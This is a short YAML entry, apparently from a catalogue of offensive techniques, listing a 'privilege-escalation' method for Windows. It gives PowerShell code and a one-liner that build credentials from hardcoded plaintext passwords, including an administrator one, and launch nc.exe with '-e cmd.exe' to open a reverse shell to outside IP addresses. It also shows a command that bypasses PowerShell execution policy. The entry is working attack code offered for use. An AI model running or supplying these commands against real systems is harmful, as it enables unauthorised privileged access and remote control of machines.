---
functions:
  privilege-escalation:
    - description: Execute a function, script, or application as another user
      code: |
        $secpasswd = ConvertTo-SecureString "aliceisnothere" -AsPlainText -Force
        $mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
        $computer = "localhost"
        [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.119.149 9090 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

        Oneliner:
        $secpasswd = ConvertTo-SecureString "MEGACORP_4dm1n!!" -AsPlainText -Force;$mycreds = New-Object System.Management.Automation.PSCredential ("administrator", $secpasswd);$computer = "localhost";[System.Diagnostics.Process]::Start("nc.exe","10.10.14.61 2177 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

        Run:
        powershell -c "Set-ExecutionPolicy -Scope CurrentUser bypass;./runas.ps1"
---
